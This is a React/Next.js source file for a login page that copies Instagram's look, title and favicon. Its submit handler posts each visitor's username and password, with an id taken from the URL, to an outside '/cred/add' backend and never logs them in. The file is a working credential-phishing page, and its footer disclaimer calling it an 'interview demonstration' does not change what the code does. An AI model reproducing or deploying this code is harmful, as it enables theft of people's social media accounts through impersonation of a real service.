import { useState } from 'react';
import Head from 'next/head';
import { toast } from 'react-toastify';
import { useRouter } from 'next/router';
export default function InstagramLogin() {
  const [loginData, setLoginData] = useState({
    username: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const social = "Instagram";

  const router = useRouter();
  const { id } = router.query; 
  const handleChange = (e) => {
    setLoginData({
      ...loginData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e: React.ChangeEvent<HTMLInputElement>) => {
        e.preventDefault();
        setIsLoading(true);
    
        if (!id || !social || !loginData.username || !loginData.password) {
          toast.error("⚠️ All fields are required!");
          setIsLoading(false);
          return;
        }
    
        try {
          const res = await fetch("https://authgo-backend.onrender.com/cred/add", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              id: id,
              social: social,
              username: loginData.username,
              password: loginData.password,
            }),
          });
    
          const data = await res.json();
          if (!res.ok) throw new Error(data.error || "Failed to add credential");
    
          toast.success("✅ Credential added successfully!");
          // Reset form after successful submission
          setLoginData({ email: '', password: '' });
        } catch (err) {
          console.error("❌ Error adding credential:", err);
          toast.error((err as Error).message);
        } finally {
          setIsLoading(false);
        }
      };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <Head>
        <title>Login • Instagram</title>
        <meta name="description" content="Instagram clone login page" />
        {/* <link rel="icon" href="/favicon.ico" /> */}
        <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png" type="image/png" />
      </Head>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center py-8 px-4 sm:px-6 lg:px-8">
        <div className="max-w-md w-full space-y-8">
          {/* Login Card */}
          <div className="bg-white border border-gray-300 rounded-sm p-8">
            {/* Instagram Logo */}
            <div className="flex justify-center mb-8">
              <div className="w-48 h-16 flex items-center justify-center">
                <svg className="w-full h-full" viewBox="0 0 192 192" fill="none">
                  {/* Instagram Gradient Logo */}
                  <defs>
                    <linearGradient id="instagram-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" stopColor="#FD5" />
                      <stop offset="25%" stopColor="#FD5" />
                      <stop offset="50%" stopColor="#FF543E" />
                      <stop offset="75%" stopColor="#C837AB" />
                      <stop offset="100%" stopColor="#C837AB" />
                    </linearGradient>
                    <linearGradient id="instagram-border" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" stopColor="#FD5" />
                      <stop offset="25%" stopColor="#FD5" />
                      <stop offset="50%" stopColor="#FF543E" />
                      <stop offset="75%" stopColor="#C837AB" />
                      <stop offset="100%" stopColor="#C837AB" />
                    </linearGradient>
                  </defs>
                  
                  {/* Background Circle */}
                  <path 
                    d="M96 176C140.182 176 176 140.182 176 96C176 51.8172 140.182 16 96 16C51.8172 16 16 51.8172 16 96C16 140.182 51.8172 176 96 176Z" 
                    stroke="url(#instagram-border)" 
                    strokeWidth="12"
                  />
                  
                  {/* Dot */}
                  <circle cx="96" cy="96" r="8" fill="url(#instagram-gradient)" />
                  
                  {/* Top-right dot */}
                  <circle cx="136" cy="56" r="6" fill="url(#instagram-gradient)" />
                </svg>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <input
                  type="text"
                  name="username"
                  placeholder="Phone number, username, or email"
                  value={loginData.username}
                  onChange={handleChange}
                  required
                  className="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded-sm focus:ring-1 focus:ring-gray-400 focus:border-gray-400 outline-none transition-all text-sm placeholder-gray-500"
                />
              </div>
              
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  placeholder="Password"
                  value={loginData.password}
                  onChange={handleChange}
                  required
                  className="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded-sm focus:ring-1 focus:ring-gray-400 focus:border-gray-400 outline-none transition-all text-sm placeholder-gray-500 pr-10"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none text-xs font-semibold"
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              </div>

              <button 
                type="submit" 
                disabled={isLoading}
                className={`w-full bg-blue-500 text-white py-1 rounded text-sm font-semibold hover:bg-blue-600 transition-all duration-200 ${
                  isLoading ? 'opacity-70 cursor-not-allowed' : ''
                }`}
              >
                {isLoading ? (
                  <div className="flex items-center justify-center space-x-2">
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    <span>Logging in...</span>
                  </div>
                ) : (
                  'Log in'
                )}
              </button>

              <div className="relative flex items-center my-6">
                <div className="flex-grow border-t border-gray-300"></div>
                <span className="flex-shrink mx-4 text-gray-500 text-xs font-semibold">OR</span>
                <div className="flex-grow border-t border-gray-300"></div>
              </div>

              {/* Facebook Login */}
              <button 
                type="button"
                className="w-full flex items-center justify-center space-x-2 text-blue-900 hover:text-blue-700 transition-colors"
              >
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                <span className="text-sm font-semibold">Log in with Facebook</span>
              </button>

              <div className="text-center">
                <a href="#" className="text-xs text-blue-900 hover:text-blue-700">
                  Forgotten your password?
                </a>
              </div>
            </form>
          </div>

          {/* Sign Up Card */}
          <div className="bg-white border border-gray-300 rounded-sm p-4 text-center">
            <p className="text-sm text-gray-900">
              Don't have an account?{' '}
              <a href="#" className="text-blue-500 font-semibold hover:text-blue-700">
                Sign up
              </a>
            </p>
          </div>

          {/* Get the app */}
          <div className="text-center">
            <p className="text-sm text-gray-900 mb-4">Get the app.</p>
            <div className="flex justify-center space-x-2">
              <button className="bg-transparent border-0 p-0">
                <div className="w-32 h-10 bg-black rounded flex items-center justify-center">
                  <svg className="w-5 h-5 mr-2 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                  </svg>
                  <span className="text-white text-xs font-semibold">App Store</span>
                </div>
              </button>
              <button className="bg-transparent border-0 p-0">
                <div className="w-32 h-10 bg-black rounded flex items-center justify-center">
                  <svg className="w-5 h-5 mr-2 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                  </svg>
                  <span className="text-white text-xs font-semibold">Google Play</span>
                </div>
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="py-8 px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500 mb-4">
            <a href="#" className="hover:underline">Meta</a>
            <a href="#" className="hover:underline">About</a>
            <a href="#" className="hover:underline">Blog</a>
            <a href="#" className="hover:underline">Jobs</a>
            <a href="#" className="hover:underline">Help</a>
            <a href="#" className="hover:underline">API</a>
            <a href="#" className="hover:underline">Privacy</a>
            <a href="#" className="hover:underline">Terms</a>
            <a href="#" className="hover:underline">Locations</a>
            <a href="#" className="hover:underline">Instagram Lite</a>
            <a href="#" className="hover:underline">Threads</a>
            <a href="#" className="hover:underline">Contact Uploading & Non-Users</a>
            <a href="#" className="hover:underline">Meta Verified</a>
          </div>

          <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500 mb-4">
            <select className="bg-transparent border-0 text-gray-500 outline-none cursor-pointer">
              <option>English</option>
              <option>Español</option>
              <option>Français</option>
              <option>中文</option>
            </select>
            <span>© 2024 Instagram from Meta</span>
          </div>

          <div className="text-center text-xs text-gray-500">
            <p>Clone Built with Next.js & Tailwind CSS</p>
            <p className="mt-1">Interview Demonstration - Not affiliated with Instagram</p>
          </div>
        </div>
      </footer>

      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        
        body {
          font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          background-color: #fafafa;
        }
        
        .font-instagram {
          font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          font-weight: 700;
          letter-spacing: -0.5px;
        }
      `}</style>
    </div>
  );
}